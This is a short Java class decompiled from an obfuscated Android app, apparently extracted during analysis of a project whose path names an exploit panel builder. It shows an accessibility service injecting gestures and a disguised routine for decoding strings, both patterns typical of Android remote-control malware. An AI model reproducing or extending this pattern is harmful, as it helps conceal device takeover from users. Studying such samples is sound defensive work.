package v.s;

import android.accessibilityservice.GestureDescription;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class AuGYnq4dE8pY extends LGm23hksIOxB implements deLJ4Z0aL3hcJ3O1 {
    public final /* synthetic */ String Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ GestureDescription JXn4Qf7zpnLjP5;
    public final /* synthetic */ DataQFAdapter vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AuGYnq4dE8pY(DataQFAdapter dataQFAdapter, GestureDescription gestureDescription, String str) {
        super(1);
        this.vekpFI4d1Nc4fakF = dataQFAdapter;
        this.JXn4Qf7zpnLjP5 = gestureDescription;
        this.Ee8d2j4S9Vm5yGuR = str;
    }

    private static /* synthetic */ void oknhth() {
    }

    @Override // v.s.deLJ4Z0aL3hcJ3O1
    public final Object pyu8ovAipBTLYAiKab(Object obj) {
        JRdueaGIH5g8DVCPba jRdueaGIH5g8DVCPba = (JRdueaGIH5g8DVCPba) obj;
        DataQFAdapter dataQFAdapter = this.vekpFI4d1Nc4fakF;
        try {
            dataQFAdapter.dispatchGesture(this.JXn4Qf7zpnLjP5, new XlFTiUImwb1gEhg(this.Ee8d2j4S9Vm5yGuR, jRdueaGIH5g8DVCPba), dataQFAdapter.handler);
        } catch (Exception e) {
            String unused = DataQFAdapter.TAG;
            TypefaceCache.obtain("006300720052009400E000BE00C600A4002B0036005E009500E200B000C000FD0063");
            e.getMessage();
            jRdueaGIH5g8DVCPba.w9sT1Swbhx3hs();
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
